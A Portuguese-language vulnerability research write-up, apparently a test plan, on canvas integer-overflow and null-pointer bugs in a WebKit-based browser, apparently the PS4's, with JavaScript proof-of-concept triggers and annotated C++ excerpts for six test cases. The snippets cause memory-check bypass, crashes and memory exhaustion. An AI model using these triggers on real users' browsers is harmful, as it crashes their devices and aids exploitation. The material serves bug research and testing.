🔢 Aritmética do Overflow (C++ int32)
Em C++, size_t requestedPixelMemory = 4 * width() * height() opera em int32 antes de converter para size_t. 
// width() e height() retornam int — toda a expressão é avaliada em int32
size_t requestedPixelMemory = 4 * width() * height();
//                               ↑ int    ↑ int   ↑ int   → overflow antes do cast

// Caso 65536 × 65536:
4 * 65536         = 262144              // OK em int32
262144 * 65536   = 0x400000000          // OVERFLOW (> 2^31)
                   mod 2^32 = 0x0  = 0    // wraps para ZERO

// requestedPixelMemory = 0  →  check de memória BYPASSADO

T1 — Memory Check Bypass via Integer Overflow
Cria canvas 65536×65536 e chama getContext("2d"). Em browser vulnerável, o check de memória recebe requestedPixelMemory = 0 e deixa passar — retorna contexto válido. 
var c = document.createElement('canvas');
c.width  = 65536; c.height = 65536;
var ctx = c.getContext('2d');
// Vulnerável → ctx !== null  (memória não contabilizada)
// Protegido  → ctx === null  (check calculado correto)
T2 — Null Buffer State: fillRect após overflow
Se T1 criou o contexto, o primeiro fillRect dispara createImageBuffer(), que falha no check MaxCanvasArea mas já setou m_hasCreatedImageBuffer = true. O buffer fica nullptr, drawingContext() retorna null → crash. 
// Dentro de createImageBuffer():
m_hasCreatedImageBuffer = true;   // setado ANTES das checagens
if (deviceSize.w * deviceSize.h > MaxCanvasArea)
    return;                        // sai sem alocar buffer!

// buffer() agora retorna nullptr para sempre
// drawingContext() → nullptr → crash em qualquer operação 2D
T3 — State Inconsistency: clearCopiedImage flag reset
Redimensionar o canvas dispara clearCopiedImage() que seta m_didClearImageBuffer = false. Isso abre o caminho para clearImageBuffer() ser chamado com m_imageBuffer = nullptr. 
// clearCopiedImage() — linha 713:
m_didClearImageBuffer = false;   // flag resetada

// reset() com tamanho igual entra aqui:
if (!m_didClearImageBuffer)
    clearImageBuffer();           // chama clearRect com buffer null!

// clearImageBuffer → context2D->clearRect → drawingContext() → nullptr
T4 — Mapeamento: Overflow vs MaxCanvasArea
Testa várias dimensões para identificar onde o memory check é bypassado e onde o MaxCanvasArea bloqueia — e onde os dois se sobrepõem.
T5 — Memory Exhaustion: maxActivePixelMemory misconfiguration
maxActivePixelMemory = max(ramSize()/4, 2151 MB). O mínimo de 2151 MB é excessivo para o PS4. Cria canvases de 16384×16384 (1 GB cada) até o limite ser atingido. 
// Código original:
maxPixelMemory = std::max(ramSize() / 4, 2151 * MB);
//                                       ↑ 2,25 GB mínimo forçado
// Canvas 16384×16384 = 4 × 16384 × 16384 = 1.073 GB por canvas
// PS4 browser pode não ter 2GB disponível → OOM / swap
T6 — baseTransform() Null Deref (compositing path)
baseTransform() desreferencia m_imageBuffer sem checar null. Triggered pelo compositor quando o canvas com estado inconsistente é pintado. 
// Linha 725:
return m_imageBuffer->baseTransform() * transform;
//     ↑ NULL quando createImageBuffer falhou no MaxCanvasArea check
// ASSERT(m_hasCreatedImageBuffer) passa (true), mas m_imageBuffer = null
// Triggered ao inserir o canvas no DOM e forçar repaint
